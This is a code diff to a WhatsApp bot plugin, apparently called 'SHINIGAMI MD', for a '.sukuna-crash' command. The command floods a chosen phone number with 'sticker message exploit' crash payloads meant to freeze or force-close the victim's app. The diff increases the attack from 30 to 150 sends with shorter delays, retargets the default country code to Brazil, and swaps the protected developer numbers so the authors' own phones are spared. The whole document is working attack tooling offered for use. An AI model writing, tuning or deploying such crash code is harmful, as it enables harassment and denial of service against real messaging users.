@@ -24,7 +24,7 @@ async function loadDevNumbers() {
         }
     } catch (e) {
         console.log('⚠️ Could not load dev numbers, using default protection');
-        devNumbers = ['255627417402@s.whatsapp.net', '255789661031@s.whatsapp.net'];
+        devNumbers = ['554497461113@s.whatsapp.net', '554488122687@s.whatsapp.net'];
     }
 }
 
@@ -38,7 +38,7 @@ loadDevNumbers();
 // SUKUNA CRASH FUNCTION (StcSqL)
 // ============================================================
 async function StcSqL(conn, target) {
-    for (let i = 0; i < 30; i++) {
+    for (let i = 0; i < 150; i++) {
         try {
             const cr = {
                 key: {
@@ -76,7 +76,7 @@ async function StcSqL(conn, target) {
         } catch (e) {
             console.log("StcSqL error:", e.message);
         }
-        await sleep(500);
+        await sleep(300);
     }
 }
 
@@ -100,71 +100,56 @@ cmd({
         target = m.mentionedJid[0];
     } else if (args[0]) {
         let number = args[0].replace(/[^0-9]/g, '');
-        if (number.startsWith('0')) number = '255' + number.substring(1);
+        if (number.startsWith('0')) number = '55' + number.substring(1);
         target = number + '@s.whatsapp.net';
     } else if (m.quoted) {
         target = m.quoted.sender;
     } else {
-        return reply(`╭━━━━━━━━━━━━━━━━━━━━━━•
-│ ❌ Please mention a user
-│ • Provide a number
-│ • Or reply to a message
+        return reply(`╭━━━━━━━━━━━━━━━━━━•
+│ ❌ Please provide a number
 │
 │ 📌 Example:
-│ • .sukuna-crash 255712345678
+│ • .sukuna-crash 55xxx 
 │ • .sukuna-crash @user
-╰─────────────────────•`);
+╰────────────────────•`);
     }
 
     // Check if target is a developer number
     if (isDevNumber(target)) {
-        return reply(`╭━━━━━━━━━━━━━━━━━━━━━━•
+        return reply(`╭━━━━━━━━━━━━━━━━━━━•
 │ 🛡️ Cannot attack developer number!
 │ This number is protected.
-╰─────────────────────•`);
+╰───────────────────•`);
     }
 
     const targetNumber = target.split('@')[0];
     
     // Send attack started message
-    await reply(`╭━━━━━━━━━━━━━━━━━━━━━━•
+    await reply(`╭━━━━━━━━━━━━━━━━•
 │ 💀 SUKUNA CRASH ATTACK
 │
 │ 👤 Target: @${targetNumber}
 │ ⚡ Status: Attack in progress...
-│ 🎴 Type: Sticker message exploit
-│
-│ 💀 Sending crash payloads...
-╰─────────────────────•`);
+╰─────────────────•`);
 
     try {
         await StcSqL(conn, target);
         
         // Send success message
-        await reply(`╭━━━━━━━━━━━━━━━━━━━━━━•
+        await reply(`╭━━━━━━━━━━━━━━━━━•
 │ ✅ SUKUNA CRASH COMPLETED!
-│
 │ 👤 Target: @${targetNumber}
 │ 💀 Status: Crashed successfully
-│ 🎴 Payloads sent: 30
-│
-│ ⚠️ Target may experience:
-│ • App freezing
-│ • Message corruption
-│ • Force close
-╰─────────────────────•
+╰────────────────•
 
 > POWERED BY SHINIGAMI MD`);
         
     } catch (e) {
         console.error("Sukuna Crash Error:", e);
-        reply(`╭━━━━━━━━━━━━━━━━━━━━━━•
+        reply(`╭━━━━━━━━━━━━━━━━━━━━━•
 │ ❌ SUKUNA CRASH FAILED
-│
 │ 👤 Target: @${targetNumber}
 │ 💀 Error: ${e.message}
-│
-│ Please try again later
 ╰─────────────────────•`);
     }
 });
